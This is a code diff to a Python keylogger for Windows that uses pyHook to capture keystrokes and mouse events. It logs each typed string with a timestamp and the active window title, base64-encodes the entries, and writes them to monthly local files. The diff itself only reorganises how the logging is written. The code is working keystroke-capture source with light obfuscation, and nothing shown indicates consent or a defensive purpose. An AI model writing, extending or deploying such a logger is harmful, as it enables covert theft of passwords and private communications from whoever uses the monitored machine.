@@ -8,7 +8,7 @@ import pyHook
 import base64
 
 handle = open(r'E:\software\keyboard_keeper_log\mouse.txt', 'a')
-key_handle = open(r'E:\software\keyboard_keeper_log\keyboard.txt', 'a')
+# key_handle = open(r'E:\software\keyboard_keeper_log\keyboard.txt', 'a')
 
 
 # print "MessageName:", event.MessageName
@@ -48,6 +48,15 @@ class KeyType(object):
 
 # 记录栈,只执行append,pop,从头遍历,清空 操作
 key_stack = []
+
+
+def write_log(log_txt):
+    cur_month = time.strftime('%Y_%m')
+    log_file = 'E:\software\keyboard_keeper_log\{0}_keyboard.txt'.format(cur_month)
+    file_handle = open(log_file, 'a')
+    file_handle.write(log_txt)
+    file_handle.flush()
+    file_handle.close()
 
 
 def on_mouse_event(event):
@@ -107,6 +116,7 @@ def on_keyboard_event(event):
         for key in key_stack:
             # 过滤掉Ctrl Alt Shift 键
             if key.ascii_code != 0:
+
                 write_line.append(key.ascii_chr)
         # key_handle.write(key.ascii_chr)
         if len(write_line) > 0:
@@ -114,8 +124,7 @@ def on_keyboard_event(event):
             cur_window = key_stack[-1].window_name
             write_str = cur_time + '|' + cur_window + '---------->' + ''.join(write_line)
             write_str = base64.encodestring(write_str)
-            key_handle.write(write_str + '\n')
-            key_handle.flush()
+            write_log(write_str + '\n')
         key_stack = []
 
     return True
@@ -139,4 +148,4 @@ def main():
 if __name__ == "__main__":
     main()
     handle.close()
-    key_handle.close()
+    # key_handle.close()
